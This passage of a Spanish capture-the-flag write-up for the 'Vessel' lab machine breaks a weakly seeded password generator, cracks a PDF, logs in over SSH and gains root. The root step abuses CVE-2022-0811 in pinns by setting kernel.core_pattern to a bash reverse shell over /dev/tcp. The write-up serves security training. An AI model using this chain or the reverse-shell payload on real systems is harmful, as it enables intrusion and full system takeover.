+
+        self.copy()
+
+    def genPassword(self):
+        length = value
+        char = index
+        if char == 0:
+            charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?'
+        elif char == 1:
+            charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
+        elif char == 2:
+            charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
+        try:
+            qsrand(QTime.currentTime().msec())
+            password = ''
+            for i in range(length):
+                idx = qrand() % len(charset)
+                nchar = charset[idx]
+                password += str(nchar)
+
+        except:
+            msg = QMessageBox()
+            msg.setWindowTitle('Error')
+            msg.setText('Error while generating password!, Send a message to the Author!')
+            x = msg.exec_()
+
+        return password
+
+
+if __name__ == '__main__':
+    app = QtWidgets.QApplication()
+    mainwindow = MainWindow()
+    mainwindow.show()
+    app.exec_()
+{% endhighlight %}
+
+De todo este montón de código la parte que nos interesa es el método `#genPassword(self)`, analizándolo vemos que primero compara que juego de carácteres hemos seleccionado en el programa y la longitud de la contraseña, luego la genera iterando por el juego de carácteres seleccionado dividiendo el tamaño del charset por el valor devuelto de la función `qrand()`
+
+Esta función es implementada de la librería PySide, genera un número aleatorio en base a una semilla puesta por la función `qsrand()`, pero qrand es totalmente dependiente de esta ya que solamente generará números distintos si la semilla cambia. Si vemos el código la semilla que se le pasa al generador de números son los milisegundos de la hora actual.... y he aquí el problema; la cantidad máxima de milisegundos es de 1000 por lo que existen solo 1000 combinaciones posibles para cada salida del programa.
+
+Vamos a adaptar un método para generar todas las combinaciones posibles en base a la imagen que tenemos a una función usable como script:
+
+{% highlight python %}
+from PySide2.QtCore import *
+
+def genPassword(file, x):
+    length = 32
+    char = 0
+    if char == 0:
+        charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?'
+    elif char == 1:
+        charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
+    elif char == 2:
+        charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
+    try:
+      qsrand(x)
+      password = ''
+      for i in range(length):
+        idx = qrand() % len(charset)
+        nchar = charset[idx]
+        password += str(nchar)
+		file.write(password + "\n")
+    except:
+      print("Something strange happened")
+	
+handle = open("passwords.txt", "a")
+
+for x in range(1000):
+  genPassword(handle, x)
+
+handle.close()
+
+{% endhighlight %}
+
+Aquí hay un pequeño problema y es que el generador de números aleatorios de Qt funciona de una forma distinta según el sistema operativo, y según vimos en el screenshot parece que la contraseña fue generada en Windows por lo que para asesorarnos ejecutaremos el script en dicho sistema operativo.
+
+Si lo ejecutamos nos genera las contraseñas:
+
+{% highlight powershell %}
+PS C:\Users\samua\Downloads\things> python script.py
+PS C:\Users\samua\Downloads\things> cat passwords.txt
+m#5isx?%l>^#-O%[te9<0dcHi{tPY9r5
+psP%i9,{<}JV1G:u7QVH<I+@ZL$axwSK
+tY[<Z*;.Z(n#O)Yd.S)kDDxvgh?V-k:m
+w=mNA|]H)@&U#@o>LFixa(Hfnolf;o6:
+z5Oe[D}RN6K@ro4^Y]<0i$*Pe!7aTcgV
+3j~!*N+b9$pTFg*jl:u-6tr.l,]lsQHw
+...
+{% endhighlight %}
+
+Tengo WSL (Windows Subsystem for Linux) instalado en mi máquina por lo que lo usaré para utilizar la herramienta para efectuar brute-force.
+
+Obteniendo el hash del pdf con pdf2john e inténtandolo crackear con el mismo John obtenemos la combinación correcta
+
+{% highlight bash %}
+┌──(vzon㉿DESKTOP-U00V****)-[~]                                                               
+└─$ john -w=passwords.txt hash                                                               
+Using default input encoding: UTF-8                                                          
+Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])                                        
+Cost 1 (revision) is 3 for all loaded hashes                                                 
+Will run 4 OpenMP threads                                                                    
+Press 'q' or Ctrl-C to abort, almost any other key for status                                
+YG7Q7RDzA+q&ke~MJ8!yRzoI^VQxSqSS (note.pdf)
+{% endhighlight %}
+
+Al utilizarla en el PDF ya nos permite verlo
+
+![PDF](/assets/writeups/vessel/10.png)
+
+Es una conversación entre Steven y Ethan en la cual el último dice que estará de vacaciones y dejó de encargado a Steven del sistema para que lo administre y lo mantenga actualizado, por esto mismo le dió sus credenciales a Steven.
+
+Utilizando estas credenciales por SSH obtenemos acceso como el usuario ethan y podremos ver la primera flag
+
+{% highlight bash %}
+❯ /usr/bin/ssh ethan@vessel.htb
+ethan@vessel.htb\'s password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-124-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue 28 Mar 2023 08:54:06 PM UTC
+
+  System load:  0.0               Processes:             224
+  Usage of /:   66.6% of 4.76GB   Users logged in:       0
+  Memory usage: 18%               IPv4 address for eth0: 10.10.11.178
+  Swap usage:   0%
+
+  => There is 1 zombie process.
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Mar 28 20:53:48 2023 from 10.10.14.82
+ethan@vessel:~$ ls
+user.txt
+ethan@vessel:~$ cat user.txt
+4edf7d1e16f35225f39a6006********
+{% endhighlight %}
+
+Estuvo bastante entretenida la intrusión, ahora vamos a convertirnos en root
+
+<h2>ESCALADA DE PRIVILEGIOS</h2>
+
+Buscando por binarios con el bit SUID activo encontramos uno inusual llamado "pinns"
+
+{% highlight bash %}
+ethan@vessel:~$ find / -perm -4000 2>/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/fusermount
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/pinns
+{% endhighlight %}
+
+Buscando por internet a ver si le pertenece a algún programa vemos que es una utilidad de CRI-O (Container Runtime Interface using Open Container Initiative) para manipular los namespaces de Linux, y también encontramos un [artículo interesante](https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/) de la página CrowdStrike:
+
+![CrowdStrike](/assets/writeups/vessel/11.png)
+
+Nos dice que Kubernetes utiliza este binario para establecer parámetros del kernel de Linux en los pods de una forma similar a esta:
+
+`pinns -s kernel_parameter1=value1+kernel_parameter2=value2`
+
+pero como no valida bien ni sanitiza los parametros que se le pasan a pinns un atacante puede agregar paramétros arbitrarios de sysctl al pod que pueden resultar en una ejecución de comandos, esto fue catalogado como el CVE-2022-0811.
+
+El sitio nos muestra como explotarlo usando Kubernetes + minikube con CRI-O de runtime, utiliza el parametro del kernel `kernel.core_pattern` para ejecutar un script cuando un Core Dump ocurra (este evento normalmente ocurre cuando un programa termina con un Segmentation Fault). Vessel no tiene Kubernetes instalado pero si CRI-O junto a runc
+
+{% highlight bash %}
+ethan@vessel:~$ crio --version
+crio version 1.19.6
+Version:       1.19.6
+GitCommit:     c12bb210e9888cf6160134c7e636ee952c45c05a
+GitTreeState:  clean
+BuildDate:     2022-03-15T18:18:24Z
+GoVersion:     go1.15.2
+Compiler:      gc
+Platform:      linux/amd64
+Linkmode:      dynamic
+ethan@vessel:~$ runc --version
+runc version 1.1.0-0ubuntu1~20.04.1
+spec: 1.0.2-dev
+go: go1.16.2
+libseccomp: 2.5.1
+{% endhighlight %}
+
+Sin embargo analizando bien el binario pinns de Vessel es **distinto al original** porque:
+
+- El original no tiene el bit SUID establecido
+- Sus hashes sha256 son distintos
+
+{% highlight bash %}
+#Ambos probados en la misma versión 1.19.6
+# ---
+#Vessel
+ethan@vessel:~$ sha256sum $(which pinns)
+6405fc112e697c27605144382aec325ebc96d3952bebc9d67797a2bface3a0b0  /usr/bin/pinns
+
+#Original
+root@cs-95777541684-default:/home/samu# sha256sum $(which pinns)
+562b0ac4ae7d72cd350965f279002370673b06e2a83d635e77f4d9e9a8eb64d3  /usr/bin/pinns
+{% endhighlight %}
+
+Es extraño esto, pero la buena parte es que el pinns de Vessel al tener el bit SUID nos da la posibilidad de poder intentar fijar un namespace y establecer la opción de sysctl `kernel.core_pattern` manualmente para llegar a ejecutar comandos como root, pero primero debemos ver como funciona el binario, si lo ejecutamos nos pide primero un path para fijar namespaces:
+
+{% highlight bash %}
+ethan@vessel:~$ pinns
+[pinns:e]: Path for pinning namespaces not specified: Invalid argument
+{% endhighlight %}
+
+Introduciendo un "--help" solo hacemos que el binario no haga nada.
+
+{% highlight bash %}
+ethan@vessel:~$ pinns --help
+ethan@vessel:~$ 
+{% endhighlight %}
+
+En fossies.org podremos encontrar lo que parece ser el código fuente del binario original de CRI-O, el de Vessel no debería diferir mucho por lo que vamos a guiarnos de aquí.
+
+![Fossies](/assets/writeups/vessel/12.png)
+
+Analizando encontramos los que parecen ser los argumentos del programa, estos para eligir cuales namespaces fijar y otras opciones si miramos más abajo en el código...
+
+{% highlight c %}
+static const struct option long_options[] = {
+  {"help", no_argument, NULL, 'h'},
+  {"uts", optional_argument, NULL, 'u'},
+  {"ipc", optional_argument, NULL, 'i'},
+  {"net", optional_argument, NULL, 'n'},
+  {"user", optional_argument, NULL, 'U'},
+  {"cgroup", optional_argument, NULL, 'c'},
+  {"mnt", optional_argument, NULL, 'm'},
+  {"dir", required_argument, NULL, 'd'},
+  {"filename", required_argument, NULL, 'f'},
+  {"uid-mapping", optional_argument, NULL, UID_MAPPING},
+  {"gid-mapping", optional_argument, NULL, GID_MAPPING},
+  {"sysctl", optional_argument, NULL, 's'},
+};
+{% endhighlight %}
+
+Si le especificamos el directorio nos va a pedir un nombre de archivo, y si creamos el archivo nos va a pedir ahora un namespace para fijar:
+
+{% highlight bash %}
+ethan@vessel:/tmp$ mkdir test
+ethan@vessel:/tmp$ pinns -d test
+[pinns:e]: Filename for pinning namespaces not specified: Invalid argument
+ethan@vessel:/tmp$ touch test/filetest
+ethan@vessel:/tmp$ pinns -d test -f test/filetest
+[pinns:e] No namespace specified for pinning
+{% endhighlight %}
+
+Supongamos que debe ser una de las opciones de ipc, mnt, cgroup, net... etc. Ahora para llegar a ejecutar un comando podriamos intentar usar la opción `-s` con la cual especificaremos un `kernel.core_pattern` personalizado para ejecutar un script que creemos, simplemente debemos iniciar el valor de dicho argumento con un "\|" y del resto poner la ruta al script:
+
+`kernel.core_pattern=|/tmp/malicious.sh`
+
+Vamos a crear dicho archivo con un comando mágico para que me devuelva una reverse shell a mi equipo, no te olvides de darle permisos de ejecución:
+
+{% highlight bash %}
+#!/bin/bash
+
+bash -c "bash -i >& /dev/tcp/10.10.14.82/443 0>&1"
+{% endhighlight %}
+
+Al ejecutar pinns con los parametros que deducimos finalmente nos mostrará un error, pero si vemos la propiedad core_pattern...
+
+{% highlight bash%}
+ethan@vessel:/tmp$ pinns -s "kernel.core_pattern=|/tmp/malicious.sh" -i -d test -f test/filetest
+[pinns:w]: Failed to create ns file: No such file or directory
+ethan@vessel:/tmp$ cat /proc/sys/kernel/core_pattern 
+|/tmp/malicious.sh
+{% endhighlight %}
+
+Se cambió con éxito, asi que ahora provoquemos un fallo de segmentación a ver si nos ejecuta el comando:
+
+{% highlight bash %}
+ethan@vessel:/tmp$ sleep 9999 &
+[1] 16809
+ethan@vessel:/tmp$ kill -s SIGSEGV 16809
+{% endhighlight %}
+
+**Mientras tanto en nuestra máquina**
+
+{% highlight bash %}
+❯ nc -lvnp 443
+Connection from 10.10.11.178:33534
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@vessel:/# script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+root@vessel:/# ^Z
+[1]  + 8892 suspended  nc -lvnp 443
+❯ stty raw -echo; fg
+[1]  + 8892 continued  nc -lvnp 443
+                                   reset xterm
+root@vessel:/# export TERM=xterm-256color
+root@vessel:/# stty rows 37 columns 151
+{% endhighlight %}
+
+¡Et voilà! El comando se ejecutó exitósamente por lo que ya podremos tomar la última flag
+
+{% highlight bash %}
+root@vessel:/# cd root
+root@vessel:/root# cat root.txt
+ad212534303c7741a41d62c9********
+{% endhighlight %}
+
+<h2>EXTRA</h2>
+
+Me puse a buscar en donde estaba el directorio `dev` en la ruta `/var/www/html/vessel/` pero extrañamente no encontré algo
+
+{% highlight bash %}
+root@vessel:/var/www/html/vessel/vessel# ls
+config  index.js  public  routes  views
+{% endhighlight %}
+
+Viendo la configuración de Apache me tope con que tiene el DocumentRoot puesto en `/var/www/html/vessel/vessel`, el mismo directorio en donde están los archivos de arriba... pero el sitio solamente me devuelve un 404 si intento hacer referencia a alguno de los ficheros antes mencionados, supongo porque solamente tiene una instrucción ProxyPass puesta.
+
+Buscando mas a fondo el repositorio logre encontrarlo:
+
+{% highlight bash %}
+root@vessel:/# find / -name .git 2>/dev/null
+/var/www/html/vessel/vessel/public/dev/.git
+{% endhighlight %}
+
+Está en la ruta public, y es esa ruta la que Express usa para proveer archivos estáticos por lo que al ser una carpeta supongo que el Apache intenta redirigirte a ella con el backslash al final, pero para Express las rutas estáticas que sean carpetas no existen asi que terminará mandando un 404 a menos que referencies un archivo directamente.
+
+El archivo de ExploitDB para explotar de forma automatizada el CVE-2022-24637 tiene el identificador 51026.
+
+{% highlight bash %}
+❯ searchsploit Open Web Analytics
+--------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                       |  Path
+--------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Open Web Analytics 1.2.3 - Multiple File Inclusions                                                                  | php/webapps/11903.txt
+Open Web Analytics 1.5.4 - 'owa_email_address' SQL Injection                                                         | php/webapps/31738.py
+Open Web Analytics 1.7.3 - Remote Code Execution  - $this                                                           | php/webapps/51026.py
+--------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+{% endhighlight %}
